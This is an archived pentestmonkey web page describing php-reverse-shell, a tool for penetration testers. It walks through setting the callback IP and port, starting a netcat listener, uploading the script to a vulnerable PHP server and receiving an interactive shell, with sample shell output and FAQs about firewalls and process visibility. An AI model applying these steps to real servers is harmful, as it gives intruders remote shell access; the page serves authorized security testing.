<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
<head profile="http://gmpg.org/xfn/11">
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>php-reverse-shell | pentestmonkey</title>
<link rel="stylesheet" href="../../wp-content/themes/baza-noclegowa/style.css" type="text/css" media="screen" />
<link rel="pingback" href="https://pentestmonkey.net/xmlrpc.php" />
<meta name='robots' content='max-image-preview:large' />
<link rel='dns-prefetch' href='https://s.w.org/' />
<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Feed" href="../../feed" />
<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Comments Feed" href="../../comments/feed" />
<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; php-reverse-shell Comments Feed" href="../web-shells/php-reverse-shell/feed" />
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/pentestmonkey.net\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.8.3"}};
			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='wp-block-library-css'  href='../../wp-includes/css/dist/block-library/style.min.css%3Fver=5.8.3.css' type='text/css' media='all' />
<link rel="https://api.w.org/" href="../../wp-json/index.html" /><link rel="alternate" type="application/json" href="../../wp-json/wp/v2/posts/111" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../xmlrpc.php%3Frsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="../../wp-includes/wlwmanifest.xml" /> 
<link rel="canonical" href="../php-reverse-shell.html" />
<link rel='shortlink' href='../../index.html%3Fp=111.html' />
<link rel="alternate" type="application/json+oembed" href="../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fpentestmonkey.net%252Ftools%252Fweb-shells%252Fphp-reverse-shell" />
<link rel="alternate" type="text/xml+oembed" href="../../wp-json/oembed/1.0/embed%3Furl=https:%252F%252Fpentestmonkey.net%252Ftools%252Fweb-shells%252Fphp-reverse-shell&amp;format=xml" />
	
<!--[if IE 6]><script src="https://pentestmonkey.net/wp-content/themes/baza-noclegowa/js/DD_belatedPNG.js"></script><![endif]-->
</head>
<body class="post-template-default single single-post postid-111 single-format-standard">
	<div class="all-page">
		
		<div class="container">
			
			<!-- HEADER -->
			<div id="header">
			    <div class="website-name"><a href="../../index.html">pentestmonkey</a></div>
				<div class="slogan">Taking the monkey work out of pentesting</div>
			</div>
			<div class="clear"></div>
			<!-- /HEADER -->

			<!-- main NAVIGATION -->
			<div id="mainNav">
				<div class="wrap">
    <ul id="menu-cheat-sheets" class="menu"><li id="menu-item-133" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133"><a href="../../category/site-news.html"><span>Site News</span></a></li>
<li id="menu-item-130" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-130"><a href="../../category/blog/index.html"><span>Blog</span></a></li>
<li id="menu-item-136" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-136"><a href="../../category/tools/index.html"><span>Tools</span></a></li>
<li id="menu-item-137" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-137"><a href="../../category/yaptest/index.html"><span>Yaptest</span></a></li>
<li id="menu-item-134" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-134"><a href="../../category/cheat-sheet.html"><span>Cheat Sheets</span></a></li>
<li id="menu-item-135" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-135"><a href="../../category/contact.html"><span>Contact</span></a></li>
</ul>    <div class="clear"><!-- --></div>
				</div>
			</div>
			<!-- /main NAVIGATION -->
			<div class="clear"></div>


			<!-- CONTENT -->
			<div id="content">
	<!-- Start: Left Panel -->
	<div class="content">

	
		<div class="post-111 post type-post status-publish format-standard hentry category-web-shells tag-pentest tag-php tag-reverseshell tag-tool" id="post-111">
			<h1>php-reverse-shell</h1>

			<div class="entryContent">
				<p>This tool is designed for those situations during a pentest where you have upload access to a webserver that&#8217;s running PHP.  Upload this script to somewhere in the web root then run it by accessing the appropriate URL in your browser.  The script will open an outbound TCP connection from the webserver to a host and port of your choice.  Bound to this TCP connection will be a shell.</p>
<p>This will be a proper interactive shell in which you can run interective programs like telnet, ssh and su.  It differs from web form-based shell which allow you to send a single command, then return you the output.<br />
<span id="more-111"></span></p>
<h2>Download</h2>
<p><a href="php-reverse-shell-1.0.tar.gz">php-reverse-shell-1.0.tar.gz</a></p>
<p>MD5sum:2bdf99cee7b302afdc45d1d51ac7e373</p>
<p>SHA1sum: 30a26d5b5e30d819679e0d1eb44e46814892a4ee</p>
<h2>Video</h2>
<p>I stumbled across this <a href="http://www.youtube.com/watch?v=A0Ks4MfhVIE">video</a> someone made of php-reverse-shell.</p>
<p><em>Update 2011-11: Imax sent me a link to his tool <a href="http://code.google.com/p/fimap/">fimap</a> which uses php-reverse-shell.  Looks cool.</em></p>
<h2>Walk Through</h2>
<h3>Modify the source</h3>
<p>To prevent someone else from abusing your backdoor &#8211; a nightmare scenario while pentesting &#8211; you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of php-reverse-shell.php:</p>
<pre>$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS</pre>
<h3>Get Ready to catch the reverse shell</h3>
<p>Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):</p>
<pre>$ nc -v -n -l -p 1234</pre>
<h3>Upload and Run the script</h3>
<p>Using whatever vulnerability you&#8217;ve discovered in the website, upload php-reverse-shell.php.  Run the script simply by browsing to the newly uploaded file in your web browser (NB: You won&#8217;t see any output on the web page, it&#8217;ll just hang if successful):</p>
<pre>http://somesite/php-reverse-shell.php</pre>
<h3>Enjoy your new shell</h3>
<p>If all went well, the web server should have thrown back a shell to your netcat listener.  Some useful commans such as w, uname -a, id and pwd are run automatically for you:</p>
<pre>$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58012
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
 16:59:28 up 39 days, 19:54,  2 users,  load average: 0.18, 0.13, 0.10
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:10m  0.01s /bin/sh
uid=81(apache) gid=81(apache) groups=81(apache)
sh: no job control in this shell
sh-3.2$</pre>
<h2>FAQs</h2>
<h3>When is this useful?</h3>
<p>Perhaps the only areas on disk that you have write access to are mounted with the &#8220;noexec&#8221; option.  Uploading a compiled program will be of no use in these situations.  You need to use an installed scripting language like Python, PERL, PHP, etc.<br />
Perhaps you just can&#8217;t be bothered to upload a second program.</p>
<h3>Isn&#8217;t the shell connection just going to be severed when the web server times out the PHP script?</h3>
<p>No.  It doesn&#8217;t seem to on the systems that I&#8217;ve tested it on (Gentoo Linux only so far).  Additionally the PHP script attempts to daemonise itself and dissociate from the parent process to avoid this (though it rarely works in practise).  Your browser will appear to hang when you access the reverse shell.  This is normal.  It&#8217;s OK to hit cancel in your browser once you&#8217;ve got your shell.</p>
<h3>Isn&#8217;t there going to be a rather suspicious looking shell process when the admin runs &#8220;ps&#8221;?</h3>
<p>Yeah.  This version of the reverse shell isn&#8217;t very subtle:</p>
<pre>apache   28106  0.0  0.0  10428  1216 ?        S    17:15   0:00 sh -c uname -a; w; id; /bin/sh -i
apache   28110  0.0  0.0  10172  1428 ?        S    17:15   0:00 /bin/sh -i</pre>
<h3>Is this page available in Serbo-Croatian?</h3>
<p>Yes. <a href="http://science.webhostinggeeks.com/php-obrnute-ljusture">Thanks to Jovana Milutinovich for translating</a>.</p>
<h2>Caveats</h2>
<p>Outbound firewalling (aka egress filtering) may prevent your reverse shell connection reaching you.  Pick a port that&#8217;s allowed through Firewall.  If there are none, you&#8217;ll have to make do with a form-based PHP shell.</p>
<p>This particular implementation of the reverse shell is unix-based.  You&#8217;ll need to modify it before it will work on windows.</p>
<p>I&#8217;ve noticed a couple of zombie processes while testing this shell.  It doesn&#8217;t always happen, but is probably to be expected since we&#8217;re not daemonising ourself properly.</p>
                <div class="clear"></div>
								<p class="postmeta"><span class="tags"><a href="../../tag/pentest/index.html" rel="tag">pentest</a>, <a href="../../tag/php.html" rel="tag">php</a>, <a href="../../tag/reverseshell.html" rel="tag">reverseshell</a>, <a href="../../tag/tool/index.html" rel="tag">tool</a></span></p>				<p class="postmeta"><span class="cats"><a href="../../category/tools/web-shells.html" rel="category tag">Web Shells</a></span></p>
								
			<p></p>
		
			<div class="navigation2">
				<div class="alignright prev"><a href="../perl-reverse-shell/index.html" rel="prev">perl-reverse-shell</a></div>
				<div class="alignleft next"><a href="../../index.html%3Fp=12.html" rel="next">Windows User Enumeration for Time Restricted Accounts</a></div>
			</div>		

			</div>
		</div>

	
<!-- You can start editing here. -->


			<!-- If comments are open, but there are no comments. -->

	 
<p></p>
<br />


	<div id="respond" class="comment-respond">
		<h3 id="reply-title" class="comment-reply-title">Leave a Reply <small><a rel="nofollow" id="cancel-comment-reply-link" href="../php-reverse-shell.html#respond" style="display:none;">Cancel reply</a></small></h3><p class="must-log-in">You must be <a href="https://pentestmonkey.net/wp-login.php?redirect_to=https%3A%2F%2Fpentestmonkey.net%2Ftools%2Fweb-shells%2Fphp-reverse-shell">logged in</a> to post a comment.</p>	</div><!-- #respond -->
	




	
	</div>
				<!-- sidebar -->
				<div class="sideBar">
					
					<div class="nav">
						<div class="bFrameT"><i></i></div>
	<form method="get" id="searchform" action="../../index.html" class="searchForm">
	<p><input type="text" value="" name="s" id="s" class="field" />
	<input type="image" src="../../wp-content/themes/baza-noclegowa/images/search.gif" alt="" title="Search" id="searchsubmit" class="btn" /></p>
</form>
<h3><span>Categories</span></h3>
			<ul>
					<li class="cat-item cat-item-5"><a href="../../category/blog/index.html">Blog</a> (78)
</li>
	<li class="cat-item cat-item-39"><a href="../../category/cheat-sheet.html">Cheat Sheets</a> (10)
<ul class='children'>
	<li class="cat-item cat-item-40"><a href="../../category/cheat-sheet/shells.html">Shells</a> (1)
</li>
	<li class="cat-item cat-item-8"><a href="../../category/cheat-sheet/sql-injection.html">SQL Injection</a> (7)
</li>
</ul>
</li>
	<li class="cat-item cat-item-7"><a href="../../category/contact.html">Contact</a> (2)
</li>
	<li class="cat-item cat-item-3"><a href="../../category/site-news.html">Site News</a> (3)
</li>
	<li class="cat-item cat-item-4"><a href="../../category/tools/index.html">Tools</a> (17)
<ul class='children'>
	<li class="cat-item cat-item-14"><a href="../../category/tools/audit.html">Audit</a> (3)
</li>
	<li class="cat-item cat-item-16"><a href="../../category/tools/misc.html">Misc</a> (7)
</li>
	<li class="cat-item cat-item-13"><a href="../../category/tools/user-enumeration.html">User Enumeration</a> (4)
</li>
	<li class="cat-item cat-item-15"><a href="../../category/tools/web-shells.html">Web Shells</a> (3)
</li>
</ul>
</li>
	<li class="cat-item cat-item-1"><a href="../../category/uncategorized.html">Uncategorized</a> (3)
</li>
	<li class="cat-item cat-item-6"><a href="../../category/yaptest/index.html">Yaptest</a> (15)
<ul class='children'>
	<li class="cat-item cat-item-12"><a href="../../category/yaptest/front-end.html">Front End</a> (1)
</li>
	<li class="cat-item cat-item-9"><a href="../../category/yaptest/installing.html">Installing</a> (2)
</li>
	<li class="cat-item cat-item-11"><a href="../../category/yaptest/overview.html">Overview</a> (2)
</li>
	<li class="cat-item cat-item-10"><a href="../../category/yaptest/using.html">Using</a> (8)
</li>
</ul>
</li>
			</ul>

						
						<div class="bFrameB"><i></i></div>
					</div>
					
				</div>
				<!-- /sidebar -->	
				</div>
				<!-- /content -->
				
			</div>
			<!-- /CONTENT -->	
			
		
		<!-- bottom NAVIGATION -->
		<div id="bottomNav">
		</div>
		<!-- /bottom NAVIGATION -->
		
		<!-- FOOTER -->
		<div id="footer">
		<p class="footer-menu">
         <ul class="menu"></ul>        </p>
			
<div class="credits">Powered by <a href="http://wordpress.org/">WordPress</a>. Design: <a href="http://www.baza-noclegowa.pl/">Baza Noclegowa</a>.</div>
			
		</div>
		<!-- /FOOTER -->
	</div>
		<script type='text/javascript' src='../../wp-includes/js/wp-embed.min.js%3Fver=5.8.3' id='wp-embed-js'></script>
</body>
</html>
